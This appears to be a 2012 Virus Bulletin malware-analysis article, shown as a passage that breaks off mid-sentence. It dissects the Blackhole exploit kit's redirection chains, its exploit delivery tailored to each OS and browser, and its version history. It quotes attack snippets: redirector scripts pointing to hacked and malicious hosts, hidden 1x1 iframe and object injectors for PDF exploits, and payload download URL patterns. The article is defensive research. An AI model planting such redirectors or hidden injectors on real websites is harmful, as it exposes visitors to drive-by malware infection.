<!DOCTYPE html>
<html lang="en" class="no-js">
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge">

<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

<script type="text/javascript">var BOOTSTRAP_VERSION ="lumen";
	var BOOTSTRAP_JS_HEAD =1;
	var BOOTSTRAP_CDN_ENABLE =0; var BOOTSTRAP_NAVBAR_TYPE =0; var BOOTSTRAP_LOGO_OPTION =0; var BOOTSTRAP_NAVBAR =1; var BootstrapInputFix =true;var BootstrapNavbarLineHeightFix =true;var BOOTSTRAP_EDT= 0; </script>
<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
<title>Virus Bulletin :: Part 2: Interaction with a black hole</title>
<meta name="description" content="Gabor Szappanos started with two fairly incomplete sources of information about the latest Blackhole server version: the server-side source code from old versions and the outgoing flow of malware. He describes how, using these sources, he was able to sketch a reasonably good picture of what goes on inside the server hosting the Blackhole exploit kit." />
<meta name="generator" content="concrete5 - 5.6.3.5" />
<script type="text/javascript">
var CCM_DISPATCHER_FILENAME = '/index.php';var CCM_CID = 1993;var CCM_EDIT_MODE = false;var CCM_ARRANGE_MODE = false;var CCM_IMAGE_PATH = "/concrete/images";
var CCM_TOOLS_PATH = "/index.php/tools/required";
var CCM_BASE_URL = "https://www.virusbulletin.com";
var CCM_REL = "";

</script>
<link rel="shortcut icon" href="/files/8914/5459/9485/VBIcon.png" type="image/x-icon" />
<link rel="icon" href="/files/8914/5459/9485/VBIcon.png" type="image/x-icon" />
<link rel="stylesheet" type="text/css" href="/concrete/css/ccm.base.css" />
<script type="text/javascript" src="/concrete/js/jquery.js"></script>
<script type="text/javascript" src="/concrete/js/ccm.base.js"></script>
<script type="text/javascript">
var COOKIES_ALLOWED=false;
</script>
<link rel="stylesheet" type="text/css" href="/packages/free_cookies_disclosure/css/cookies_disclosure.css" />
<!--[if lte IE 8]><link rel="stylesheet" type="text/css" href="/packages/free_cookies_disclosure/css/cookies_disclosure_ie.css" /><![endif]-->
<script type="text/javascript">
var COOKIES_DISCLOSURE_HIDE_INTERVAL=10;
</script>
<script type="text/javascript" src="/packages/free_cookies_disclosure/js/disclosure_hide.js"></script>
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/css/lumen/bootstrap.css" />
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/css/lumen/bootstrap-overwrites.css" />
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/css/members.css" />
<script type="text/javascript" src="/packages/bootstrap/js/common/prettify.js"></script>
<script type="text/javascript" src="/packages/bootstrap/js/common/jquery.easing.1.3.js"></script>
<script type="text/javascript" src="/packages/bootstrap/js/common/bootstrap.min.js"></script>
<link rel="stylesheet" type="text/css" href="/libraries/css/jquery.fancybox.css" />
<script type="text/javascript" src="/libraries/js/jquery.fancybox.pack.js"></script>
<link rel="stylesheet" media="screen" type="text/css" href="/files/cache/css/bootstrap/typography.css" />
<script type="text/javascript" src="/index.php/tools/packages/free_cookies_disclosure/disclosure_i18n_js"></script>
<script type="text/javascript" src="/packages/free_cookies_disclosure/js/disclosure_ajax_form.js"></script>
<link rel="stylesheet" type="text/css" href="/concrete/blocks/page_list/view.css" />
<link rel="stylesheet" type="text/css" href="/packages/remo_expand/blocks/remo_expand/templates/vbexpand/view.css" />
<script type="text/javascript" src="/packages/remo_expand/js/jquery.color.js"></script>
<script type="text/javascript" src="/packages/remo_expand/js/jquery.ba-hashchange.js"></script>
<script type="text/javascript" src="/packages/remo_expand/js/remo.expand.js"></script>
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/blocks/search/templates/VB_global_search/view.css" />
<link rel="stylesheet" type="text/css" href="/packages/travisn_spacer/css/ccm.tnspacer.css" />

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.6.3/css/font-awesome.min.css" integrity="sha384-T8Gy5hrqNKT+hzMclPo118YTQO6cYprQmhrYwIiQ/3axmI1hQomh7Ud2hPOy8SP1" crossorigin="anonymous">

<script src="https://cdnjs.cloudflare.com/ajax/libs/prettify/r298/run_prettify.js" integrity="sha256-1SFdTXlsw0RkQ+iO0E91LDshGiIbPiTYqJto0px4wds=" crossorigin="anonymous"></script>
<!--[if gte IE 9]>
<script src="/packages/bootstrap/js/common/modernizr.js"></script>
<![endif]-->

<!--[if lt IE 9]>	
	
	<script src="/packages/bootstrap/js/common/html5shiv.js"></script>
	<script src="/packages/bootstrap/js/common/respond.min.js"></script>
	
<![endif]-->
</head>
<body data-spy="scroll" data-target=".bs-sidebar">

<div class="navbar  navbar-fixed-top navbar-default  bs-docs-nav">
<div class="navbar-inner">
<div class="container"><div class="row"><div class="col-sm-4 col-md-4 logo-position-1 col-logo">
<div class="navbar-header">
<button type="button" class="navbar-toggle btn_navbar_custom">
<span class="icon-bar"></span>
<span class="icon-bar"></span>
<span class="icon-bar"></span>
</button><div class="mobile-clearfix"></div><div class="navbar-brand navbar-brand-area"><a href="/"><img border="0" class="ccm-image-block" alt="" src="/files/4614/4535/7515/logo-big.png" width="339" height="92" /></a></div> </div>
</div><div class="col-sm-8 col-md-8 logo-position-1 col-nav"> <div class="nav-collapse collapse nav_collapse_custom navbar-collapse"> <div style="clear:both"></div>
<div class="vb-global-search-div">
<form action="/index.php/global-search-results/" method="get">
<fieldset>
<input name="search_paths[]" type="hidden" value="" />
<input name="query" type="text" class="vb-global-search" placeholder="Search site..." />
<input name="submit" type="submit" value="Search!" style="display:none" />
</fieldset>
</form>
</div>
<div class="tnSpacer" style="height:48px"></div>
<ul class="nav nav-pills"><li class=" nav-first nav-item-6299"><a href="/newsletter/" target="_self" class=" nav-first nav-item-6299 ">Newsletter</a></li><li class=" nav-item-260"><a href="/conference/" target="_self" class=" nav-item-260 ">VB Conference</a></li><li class=" nav-item-166"><a href="/testing/" target="_self" class=" nav-item-166 ">VB Testing</a></li><li class=" nav-path-selected active nav-item-160"><a href="/virusbulletin/" target="_self" class=" nav-path-selected active nav-item-160 ">Bulletin</a></li><li class=" nav-last nav-item-130"><a href="/blog/" target="_self" class=" nav-last nav-item-130 ">Blog</a></li></ul> </div>
</div>
</div><div class="clearfix"></div>
</div>
</div>
</div>
<div class="navbar-top-fixed-space "><div class="clearfix"></div></div>

<div class="container m-top-20">
<div class="row">
<div class="col-md-9 col-sm-9 col-lg-9">
<div class="titlepage" xmlns=""><div><div><h1 class="title" xmlns="http://www.w3.org/1999/xhtml"><a id="vb201212-Blackhole"></a>Part 2: Interaction with a black hole</h1></div><div><p class="pubdate" xmlns="http://www.w3.org/1999/xhtml">2012-12-03</p></div><div><div class="authorgroup" xmlns="http://www.w3.org/1999/xhtml"><div class="author titlepage"><h3 class="author"><span class="surname">Gabor Szappanos</span></h3><span class="orgname">Sophos</span>, <span class="orgdiv">Hungary</span></div><b class="editedby">Editor: </b><span class="editor"><span class="firstname">Helen</span> <span class="surname">Martin</span></span></div></div><div><div class="abstract" xmlns="http://www.w3.org/1999/xhtml"><p class="title"><b>Abstract</b></p><p>Gabor Szappanos started with two fairly incomplete sources of information about the latest Blackhole server version: the server-side source code from old versions and the outgoing flow of malware. He describes how, using these sources, he was able to sketch a reasonably good picture of what goes on inside the server hosting the Blackhole exploit kit.</p></div></div><div><p class="copyright" xmlns="http://www.w3.org/1999/xhtml"><i>Copyright &copy; 2012 Virus Bulletin</i></p></div></div><hr /></div>
<div class="ccm-remo-expand">
<div id="ccm-remo-expand-title-3333" class="ccm-remo-expand-title ccm-remo-expand-closed" data-expander-speed="200">Table of contents</div><div id="ccm-remo-expand-content-3333" class="ccm-remo-expand-content"><div class="toc"><dl><dt><span class="sect1"><a href="#id4321943"></a></span></dt><dt><span class="sect1"><a href="#id4598921">Attack in detail</a></span></dt><dt><span class="sect1"><a href="#id2338525">Chain of events</a></span></dt><dd><dl><dt><span class="sect2"><a href="#id4431411">Initial vector</a></span></dt><dt><span class="sect2"><a href="#id3215304">Redirections</a></span></dt><dt><span class="sect2"><a href="#id4895570">Mainfile</a></span></dt><dt><span class="sect2"><a href="#id2455555">Downloadfile</a></span></dt></dl></dd><dt><span class="sect1"><a href="#id4121051">Individual exploits</a></span></dt><dd><dl><dt><span class="sect2"><a href="#id4310184">spl0: empty</a></span></dt><dt><span class="sect2"><a href="#id3467583">spl1: missing</a></span></dt><dt><span class="sect2"><a href="#id2188363">spl2: MDAC exploit MS06-014</a></span></dt><dt><span class="sect2"><a href="#id4432664">spl3: PDF</a></span></dt><dt><span class="sect2"><a href="#id3910153">spl4: Windows Help and Support Center Vulnerability</a></span></dt><dt><span class="sect2"><a href="#id4746007">pl5: Flash CVE-2011-0611</a></span></dt><dt><span class="sect2"><a href="#id4552423">spl6: Flash CVE-2011-2110</a></span></dt><dt><span class="sect2"><a href="#id2352920">spl7: XML Core Services &ndash; CVE-2012-1889</a></span></dt><dt><span class="sect2"><a href="#id4422461">NOJS: Java &ndash; CVE-2010-0840</a></span></dt></dl></dd><dt><span class="sect1"><a href="#id3384127">Why Java?</a></span></dt><dt><span class="sect1"><a href="#id4852045">Version 2.0</a></span></dt><dt><span class="sect1"><a href="#id4447978">Payloads</a></span></dt></dl></div></div></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id4321943"></a></h2></div></div></div><p>Clearly, I should return my university diploma in Physics after coming up with a title like this. You cannot interact with a black hole by definition. The data flow is one-sided: everything goes in, nothing comes out &ndash; which hardly qualifies as an interaction. However, this is not the case with the Blackhole exploit kit, where information flows both in and out. Yet researching the latest Blackhole server version does remind me of examining a black hole: we have no information about what goes on inside, and we can only draw conclusions based on the effects it has on its surroundings. However, every analogy breaks at some point: we can observe the malware specimens that are coming out of Blackhole &ndash; there is a definite outward flow of information.</p><p>We can also take the knowledge gathered from analysing the old Blackhole server-side code, and see how useful it is when taking apart the attacks performed with this kit.</p><p>Essentially, we have two fairly incomplete sources of information: the outdated server-side source code and the outgoing flow of malware. From these two we can sketch a reasonably good picture of what is going on inside the server hosting the Blackhole exploit kit.</p><p>We will find that even though the code in question is quite a few versions behind the current code, the overall general operation hasn&rsquo;t changed too much.</p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id4598921"></a>Attack in detail</h2></div></div></div><p>The first part of this two-part series [<span class="citation"><a href="#citation.1">1</a></span>] ended with the deobfuscation of the server code, which was not complete, but sufficient for a general understanding of its operation. It proved to be possible to follow the chain of events both from the client side and the server side. The client-side events had already been documented in detail [<span class="citation"><a href="#citation.2">2</a></span>], while the server-side part was the missing piece that this article attempts to fill.</p><p>Data about the Blackhole attacks was gathered during a relatively long period from October 2011 until September 2012, which gave an insight into the moving parts and those that remained constant.</p><p>Typically, the initial vector of attack was spammed email messages. The email either came with an attached script that redirected to the Blackhole server or contained a direct link to the server &ndash; or, in its most simplistic form, the payload executable was sent out directly with the message.</p><p>Another known vector of Blackhole distribution was the injection of downloader code into websites. This method resulted in a very similar sequence of events, with only the initial vector differing.</p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id2338525"></a>Chain of events</h2></div></div></div><p>Throughout the rest of the article I will refer to the most important server-side components as they are referred to in the configuration file (config.php). These are:</p><div class="itemizedlist"><ul type="disc"><li><p><span class="emphasis"><em>mainfile</em></span>: As the first point of contact with the server, this PHP page receives the incoming requests from the targeted computers. Upon receiving a request, this page prepares (based on information gathered from the incoming request) a custom tailored downloader script that exploits the vulnerabilities identified on the target computer.</p></li><li><p><span class="emphasis"><em>downloadfile</em></span>: The individual exploits handed out by the mainfile connect back to this PHP page. Upon receiving a request, this page hands out the binary payload to the target computer.</p></li></ul></div><p>A typical attack line consists of four distinct phases:</p><div class="orderedlist"><ol type="1"><li><p><span class="emphasis"><em>Initial vector</em></span>: The targeted host is provided with a carrier; this offers a hyperlink to initiate a chain of events that concludes in the Blackhole infection.</p></li><li><p><span class="emphasis"><em>Redirections</em></span>: The initial vector from the previous stage is redirected through intermediate sites to make tracing the attack more complicated.</p></li><li><p><span class="emphasis"><em>mainfile</em></span>: The hosting server is contacted and the server code collects and distributes the exploit functions for the targeted host.</p></li><li><p><span class="emphasis"><em>downloadfile</em></span>: After any of the served exploits from the previous phase is activated, its downloader code connects back and the server code distributes the binary (Win32) executable payload.</p></li></ol></div><p>A real example of the above scheme is shown in <a href="#figure.1">Figure 1</a>.</p><div class="figure"><a id="figure.1"></a><div class="mediaobject"><img alt="Real-life example." src="/uploads/images/figures/2012/12/Blackhole-1.jpg" /></div><p class="title"><b>Figure&nbsp;1.&nbsp;Real-life example.</b></p></div><p>Throughout the rest of the paper, I will not go into great depth on the working of the individual components if I feel that the particular component is already well documented [<span class="citation"><a href="#citation.2">2</a></span>].</p><div class="sect2" lang="en"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id4431411"></a>Initial vector</h3></div></div></div><p>All the fun starts with an official-seeming email, as illustrated in <a href="#figure.2">Figure 2</a>.</p><div class="figure"><a id="figure.2"></a><div class="mediaobject"><img alt="Typical official-looking email message." src="/uploads/images/figures/2012/12/Blackhole-2.jpg" /></div><p class="title"><b>Figure&nbsp;2.&nbsp;Typical official-looking email message.</b></p></div><p>It is interesting that in all of the identified email attacks the criminals used emails that looked like official notifications from an authority (e.g. BBB, IRS, <span class="emphasis"><em>UPS</em></span>, <span class="emphasis"><em>Amazon</em></span>, EFTPS), rather than the more basic instinct inspiring Viagra/&lsquo;naked teen girls&rsquo;/&lsquo;Britney Spears exposed&rsquo; themes that are commonly observed in other malware distribution campaigns. The HTML messages contained a link that led to the next stage. In some rare cases the entire redirections stage was skipped, and the email itself contained a direct link or a JavaScript-obfuscated link to mainfile.</p><p>The other common intrusion vector for the Blackhole attacks was web infection: HTML or JS files on web servers were injected with downloader code. The infection reportedly occurred [<span class="citation"><a href="#citation.5">5</a></span>] using stolen FTP credentials to access the websites.</p><p>The JavaScript code in <a href="#figure.3">Figure 3</a> is stored in a byte array, in which the original values are modified by an encryption key. This key is generated from the seconds value of Date(2010,11,3,2,21,4). This is an interesting date, which keeps recurring in Blackhole components: it was used in the server code, and it keeps appearing in the web infection code as well.</p><div class="figure"><a id="figure.3"></a><div class="mediaobject"><img alt="Blackhole web infection component." src="/uploads/images/figures/2012/12/Blackhole-3.jpg" /></div><p class="title"><b>Figure&nbsp;3.&nbsp;Blackhole web infection component.</b></p></div></div><div class="sect2" lang="en"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id3215304"></a>Redirections</h3></div></div></div><p>The redirections stage consisted of intermediate encrypted JavaScript files. Typically, there were a few dozen to a few hundred HTML pages to begin with. These are usually hacked legitimate websites; the URL is recognizable within a campaign. Most often it takes the form of hxxp://[legitimatedomain]/VHuzAprT/index.html, with a legitimate domain, a random directory and index.html. The other common scheme used hacked <span class="emphasis"><em>WordPress</em></span> sites, with the HTML redirector page placed in one of the default directories &ndash; for example: hxxp://stoprocking.com/wp-content/themes/twentyten/palco.html. In the latter case the HTML filename is unique within a campaign, but changes between the distribution runs, and is a filename that looks normal, but is not such a commonly used name as index.html.</p><p>These HTML pages are simple, and without any obfuscation just link to the next step, the JavaScript part:</p><pre class="programlisting">&lt;html&gt;
&lt;h1&gt;WAIT PLEASE&lt;/h1&gt;
&lt;h3&gt;Loading...&lt;/h3&gt;
&lt;script language=&rdquo;JavaScript&rdquo; type=&rdquo;text/JavaScript&rdquo; src=&rdquo;hxxp://www.grapevalleytours.com.au/ajaxam.js&rdquo;&gt;&lt;/script&gt;;
&lt;script language=&rdquo;JavaScript&rdquo; type=&rdquo;text/JavaScript&rdquo; src=&rdquo;hxxp://www.womenetcetera.com/ajaxam.js&rdquo;&gt;&lt;/script&gt;;
&lt;script language=&rdquo;JavaScript&rdquo; type=&rdquo;text/JavaScript&rdquo; src=&rdquo;hxxp://levillagesaintpaul.com/ccounter.js&rdquo;&gt;&lt;/script&gt;
&lt;script language=&rdquo;JavaScript&rdquo; type=&rdquo;text/JavaScript&rdquo; src=&rdquo;hxxp://fasttrialpayments.com/kquery.js&rdquo;&gt;&lt;/script&gt;
&lt;/html&gt;</pre><p>Typically, there are between three and five different JavaScript links, which all refer to the same, even more simplistic content.</p><pre class="programlisting">document.location=&rsquo;hxxp://downloaddatafast.serveftp.com/main.php?page=db3408bf080473cf&rsquo;;</pre><p>This stage is the most flexible part &ndash; sometimes the HTML part is missing, sometimes the JavaScript part, and rarely both of them (when the initial spammed email messages contain a direct link to the server).</p><p>At the end of the chain there is the mainfile link, which is the first encounter with the Blackhole hosting server. The link has an easy-to-recognize structure:</p><pre class="programlisting">http://{server}/{mainfile}?{threadid}={random hex digits}</pre><p>The above scheme was followed in all of the cases we observed.</p><p>{server} denotes the hosting server of the Blackhole kit, {mainfile} was the name of the main exploit dispatcher script, which returned the downloader script with the exploits. {threadid} was an identifier that was meant to identify distribution campaigns. Its value changed over time, while in the short-term may have persisted for a while when only the hosting server names changed daily. One particular thread ID, 73a07bcb51f4be71, was very enduring, appearing several times in the period between 31/01/2012 and 03/04/2012.</p><p>This thread ID was supposed to be the corner point of the Blackhole TDS functionality. It identified a set of possible configurations, distinguishing between the distribution campaigns. For each configuration set, different rules (regarding the distributed exploit) could be defined, determined by the value of the BrowserID, CountryID and OSID information gathered from the incoming request.</p><p>So in theory, Blackhole could serve custom tailored exploits for the attacked computers. In practice, however, the 1.0.2 configuration contained a single rule that served all distribution campaigns and OS/browser/country combinations. Despite the fact that a fully fledged TDS functionality was available, and that the particular code base was supposed to support 28 different server installations simultaneously, it was not utilized.</p><p>However, the situation has changed significantly in the latest identified installation. Mapping the actual state in September 2012 (version 1.2.5 of the kit), probing with different OS and browser versions, we observed a very granular TDS functionality, which is summarized in <a href="#table.1a">Table 1a</a> and <a href="#table.1b">Table 1b</a>.</p><div class="table"><a id="table.1a"></a><table border="1" summary="Exploit distribution table in relation to OS/browser version
        info."><colgroup><col /><col /><col /><col /><col /><col /><col /><col /></colgroup><thead><tr><th align="center">Exploit delivered</th><th align="center">Vista: IE7, IE8 Win7: IE9, IE10</th><th align="center">Win7: Mozilla22, Opera12, Safari5 Android: Safari5</th><th align="center">Win7: Firefox14</th><th align="center">Vista: IE6</th><th align="center">Non-Windows platforms</th><th align="center">WinNT90: IE9</th><th align="center">Win8: Chrome17</th></tr></thead><tbody><tr><td>Java (CVE-2010-0840, CVE-2012-0507)</td><td>+</td><td>+</td><td>+</td><td>+</td><td>-</td><td>+</td><td>+</td></tr><tr><td>XMLHTTP+ADODBSTREAM downloader (MS06-014)</td><td>-</td><td>-</td><td>-</td><td>+</td><td>-</td><td>-</td><td>-</td></tr><tr><td>(CVE-2009-0927, CVE-2008-2992, CVE-2009-4324, CVE-2007-5659) or CVE-2010-0188</td><td>+ (IFRAME)</td><td>+ (object)</td><td>+ (object + IFRAME)</td><td>+ (IFRAME)</td><td>-</td><td>+ (IFRAME)</td><td>+ (object)</td></tr><tr><td>HCP (CVE-2010-1885) XMLHTTP+ADODB</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>Flash (CVE-2011-0611)</td><td>-</td><td>-</td><td>-</td><td>-</td><td>+</td><td>+</td><td>+</td></tr><tr><td>Flash (CVE-2011-2110)</td><td>+</td><td>+</td><td>+</td><td>+</td><td>+</td><td>+</td><td>+</td></tr><tr><td>CVE-2012-1889</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr></tbody></table><p class="title"><b>Table&nbsp;1.&nbsp;Exploit distribution table in relation to OS/browser version info.</b></p></div><div class="table"><a id="table.1b"></a><table border="1" summary="Exploit distribution table in relation to OS/browser version
        info."><colgroup><col /><col /><col /><col /><col /><col /><col /><col /></colgroup><thead><tr><th align="center">Exploit delivered</th><th align="center">OSX: IE5 WinCE: IE4</th><th align="center">Win2K: Firefox5</th><th align="center">WinXP:IE9</th><th align="center">WinXP: Chrome17</th><th align="center">Win95: IE4 Win98: IE4, IE5, IE6 WinNT: IE5 WinNT351: IE5 WinNT40: IE5 Win2K: IE4, IE5, IE6</th><th align="center">Win2K3: IE7</th><th align="center">Win2K: IE8 WinXP: AOL96</th></tr></thead><tbody><tr><td>Java (CVE-2010-0840, CVE-2012-0507)</td><td>-</td><td>+</td><td>+</td><td>+</td><td>+</td><td>+</td><td>+</td></tr><tr><td>XMLHTTP+ADODBSTREAM downloader (MS06-014)</td><td>+</td><td>-</td><td>-</td><td>-</td><td>+</td><td>-</td><td>-</td></tr><tr><td>(CVE-2009-0927, CVE-2008-2992, CVE-2009-4324, CVE-2007-5659) or CVE-2010-0188</td><td>-</td><td>+ (object + IFRAME)</td><td>+ (IFRAME)</td><td>+ (object)</td><td>+ (IFRAME)</td><td>+ (IFRAME)</td><td>+ (object)</td></tr><tr><td>HCP (CVE-2010-1885) XMLHTTP+ADODB</td><td>-</td><td>-</td><td>+ (link)</td><td>+ (link)</td><td>-</td><td>+ (embed)</td><td>+ (embed)</td></tr><tr><td>Flash (CVE-2011-0611)</td><td>+</td><td>+</td><td>+</td><td>+</td><td>+</td><td>+</td><td>+</td></tr><tr><td>Flash (CVE-2011-2110)</td><td>+</td><td>+</td><td>+</td><td>+</td><td>+</td><td>+</td><td>+</td></tr><tr><td>CVE-2012-1889</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr></tbody></table><p class="title"><b>Table&nbsp;2.&nbsp;Exploit distribution table in relation to OS/browser version info.</b></p></div></div><div class="sect2" lang="en"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id4895570"></a>Mainfile</h3></div></div></div><p>Upon receiving the incoming request, the &lsquo;RedirectsSplit&rsquo; value in threaddata.php determines the type of reaction required. If it has some predefined value(s), it simply redirects the incoming request to the configured URL(s). If the value is not set, the exploit kit goes on to build the mainfile response, which will be a collection of functions, each of them exploiting a particular vulnerability.</p><p>Both the redirect and the attack response are logged in the MySQL database along with the IP address of the requesting victim.</p><p>The mainfile response is gathered from predefined building blocks. It consists of the JavaScript-enabled exploit functions, a general Java downloader that works without JavaScript support, and an end_redirect() finishing function. Finally, the returned script is encrypted.</p><p>The build logic is roughly the following:</p><pre class="programlisting">insert = &ldquo;end_redirect{};PluginDetect(){&hellip;};&rdquo;
if exploit_1 is selected {
  insert += &ldquo;exploit1() {exploit1_code; call exploit2()}&rdquo;
}
else {
insert += &ldquo;exploit1() { call exploit2()}&rdquo;
}
if exploit_2 is selected {
  insert += &ldquo;exploit2() {exploit2_code; call exploit3()}&rdquo;
}
else {
insert += &ldquo;exploit2() { call exploit3()}&rdquo;
}
&hellip;
insert += &ldquo;call end_redirect{}; call exploit1()&rdquo;
write NO_JS_html + JS_crypt(insert)</pre><p>The exploit functions in all 1.2.x kit versions are named spl0 through spl7. In the recently recorded attacks exploit function 0 was turned off, and exploit function 1 was absent from the building logic.</p><p>The infection script begins with the PluginDetect public library code [<span class="citation"><a href="#citation.3">3</a></span>], which is used to extract the relevant version information:</p><div class="itemizedlist"><ul type="disc"><li><p>OS</p></li><li><p>Browser (and browser version)</p></li><li><p>Adobe Flash version</p></li><li><p>Adobe Reader version</p></li><li><p>Java version</p></li></ul></div><p>This library is available for download, and in addition to the above list used by the Blackhole kit, other plug-ins are supported:</p><div class="itemizedlist"><ul type="disc"><li><p>QuickTime</p></li><li><p>DevalVR</p></li><li><p>Shockwave</p></li><li><p>Windows Media Player</p></li><li><p>Silverlight</p></li><li><p>VLC Player</p></li><li><p>RealPlayer</p></li></ul></div><p>The user-friendly download interface builds the script based on the specified settings regarding which of the plug-in versions should be included. It is not only Blackhole that has discovered this useful utility: the Bleeding Life exploit kit has used it, and recently the NeoSploit pack also added it [<span class="citation"><a href="#citation.6">6</a></span>] to its arsenal.</p><p>Blackhole has been using this library since at least version 1.0.2 &ndash; back then, it was only used in the PDF-related exploit function. Later versions, starting with 1.1.0, moved the library up front of the code, to enable it to be referenced globally by the other exploit functions as well.</p><p>The library code is inserted into the resulting script as a BASE64-encoded blob and unpacked on the fly when building the mainfile response page &ndash; which is an unusual practice. The most likely reason for this is that, this way, the author could avoid the pain of escaping all special characters in the PluginDetect code when using it as a string constant in the mainfile generation code. That would involve the error-prone process of going through about 10KB of script code, which would have to be repeated whenever the PluginDetect version or the included modules changed (which happened a couple of times over the lifetime of the Blackhole exploit kit [see <a href="#table.2">Table 2</a>]).</p><div class="table"><a id="table.2"></a><table border="1" summary="Mainfile characteristics in versions."><colgroup><col /><col /><col /><col /></colgroup><thead><tr><th align="center">Version</th><th align="center">Release date</th><th align="center">Exploit functions</th><th align="center">PluginDetect</th></tr></thead><tbody><tr><td>2.0</td><td>09/2012</td><td>-</td><td>0.7.8 (AdobeReader)</td></tr><tr><td>1.2.5</td><td>30/07/2012</td><td>spl0, spl2, spl3,spl4,spl5, spl6, spl7 spl0, spl2, spl4, spl5, spl7 blank</td><td>0.7.8 (Java, Flash, AdobeReader)</td></tr><tr><td>1.2.4</td><td>11/07/2012</td><td>spl0, spl2, spl3,spl4,spl5, spl6, spl7 spl0, spl2, spl7 blank, spl4 and spl5 sometimes blank</td><td>0.7.8 (Java, Flash, AdobeReader)</td></tr><tr><td>1.2.3</td><td>28/03/2012</td><td>spl0, spl2, spl3,spl4,spl5 spl4 blank, spl0 sometimes blank</td><td>0.7.6 ( Flash, AdobeReader)</td></tr><tr><td>1.2.2</td><td>26/02/2012</td><td>spl0, spl2, spl3,spl4,spl5 spl4 blank, spl0 blank</td><td>0.7.6 ( Flash, AdobeReader)</td></tr><tr><td>1.2.1</td><td>09/12/2011</td><td>spl0, spl1, spl2, spl3,spl4,spl5 spl4 blank</td><td>No version (Java, Flash, AdobeReader)</td></tr><tr><td>1.2.0</td><td>11/09/2011</td><td>spl0, spl2, spl3,spl4,spl5, spl6,spl7 spl6 blank</td><td>No version (Java, Flash, AdobeReader)</td></tr><tr><td>1.0.2</td><td>20/11/2010</td><td>ewvf, zazo,ai, dsfgsdfh, asgsaf</td><td>No version (AdobeReader, used in the PDF handler)</td></tr></tbody></table><p class="title"><b>Table&nbsp;3.&nbsp;Mainfile characteristics in versions.</b></p></div><p>The individual exploit functions are organized in a function call chain. If a particular exploit is selected, then the appropriate function contains the exploit code, otherwise only the call to the next exploit function is present. During the construction of the script, all rules from threaddata.php are enumerated and matched against the information gathered from the incoming HTTP request. Filters can be defined by OS version, browser ID and country ID. For each defined rule a different set of exploit functions can be returned, thus implementing the TDS functionality.</p><p>Finally, an end_redirect function is called, which redirects the browser to an innocent page, with the usual &lsquo;please wait&hellip;&rsquo; text. In some cases it additionally redirects to a Win32 executable.</p><p>At least the picture was this clear back with the 1.0.2 version. After the TDS functionality kicked in big time, and more granular system support was configured, the building logic got messy, most noticeably around the PDF exploit distribution, which in the 1.2.5 version already had three different forms.</p><p>The first form is applied when the browser is <span class="emphasis"><em>Internet Explorer</em></span>. In this case, the exploiting PDF object is inserted as an IFRAME into the mainfile response script:</p><pre class="programlisting">function show_pdf(src){var pifr=document.createElement(&lsquo;IFRAME&rsquo;);pifr.setAttribute(&lsquo;width&rsquo;,1);
pifr.setAttribute(&lsquo;height&rsquo;,1);pifr.setAttribute(&lsquo;src&rsquo;,src);document.body.appendChild(pifr)}</pre><p>With some other browsers, such as <span class="emphasis"><em>Safari</em></span> and <span class="emphasis"><em>Chrome</em></span>, this form is changed to use an object element instead of an IFRAME:</p><pre class="programlisting">function show_pdf(src){var p=document.createElement(&lsquo;object&rsquo;);p.setAttribute(&lsquo;type&rsquo;,&rsquo;application/pdf&rsquo;);
p.setAttribute(&lsquo;data&rsquo;,src);p.setAttribute(&lsquo;width&rsquo;,1);p.setAttribute(&lsquo;height&rsquo;,1);document.body.appendChild(p)}</pre><p>In the case of <span class="emphasis"><em>Firefox</em></span>, both forms are included at the same time:</p><pre class="programlisting">function show_pdf(src){var pifr=document.createElement(&lsquo;IFRAME&rsquo;);pifr.setAttribute(&lsquo;width&rsquo;,1);
pifr.setAttribute(&lsquo;height&rsquo;,1);pifr.setAttribute(&lsquo;src&rsquo;,src);document.body.appendChild(pifr)}

function show_pdf2(src){var p=document.createElement(&lsquo;object&rsquo;);p.setAttribute(&lsquo;type&rsquo;,&rsquo;application/pdf&rsquo;);
p.setAttribute(&lsquo;data&rsquo;,src);p.setAttribute(&lsquo;width&rsquo;,1);p.setAttribute(&lsquo;height&rsquo;,1);document.body.appendChild(p)}</pre><p>The HCP exploit (CVE-2010-1885) also has two forms, the first one embeds the script code directly, and the other inserts an IFRAME with a link to the PHP file on the server providing the content.</p><p>The exploit function assemblage changed with Blackhole kit releases. <a href="#table.2">Table 2</a> summarizes the mainfile characteristics of Blackhole exploit kit versions, exploit function information and the usage of the PluginDetect library. This information may help to identify the version of the underlying exploit kit in a given attack.</p><p>It is worth noting that the call order of the exploit functions, their names, and in most cases the statically inserted function bodies are all hard-coded in the Blackhole server backend code, thus cannot be changed easily. Indeed, there were only minor changes (resulting from the addition of new exploits to the kit) in the generated code, even the names of the exploit functions remained the same throughout versions 1.2.x.</p><p>There are two possible ways in which an exploit function is excluded from the mainfile script: the exploit function is missing completely, or it is a blank function, calling only the next one in the chain. The first can only be achieved by a new exploit kit release; the latter is possible via admin user interface clicks.</p><p>Each exploit function contains a connect-back URL that will be used to download and execute the Win32 binary content from the server. The URL has the following form:</p><pre class="programlisting">http://{server}/{downloadfile}?f=73a07?e=1</pre><p>Here, parameter <span class="emphasis"><em>f</em></span> is the payload identifier, <span class="emphasis"><em>e</em></span> is the exploit identifier.</p><p>(An interesting fact is that the PHP file serving the HCP vulnerability (CVE-2010-1885) connect-back URL reverses the order of the f and e parameters. It has no effect on the operation of the code, but is a remarkable deviation from the general pattern.)</p><p>As of version 1.2.5, the URL scheme for some of the attack vectors changed to serve multiple payloads instead of a single payload. The 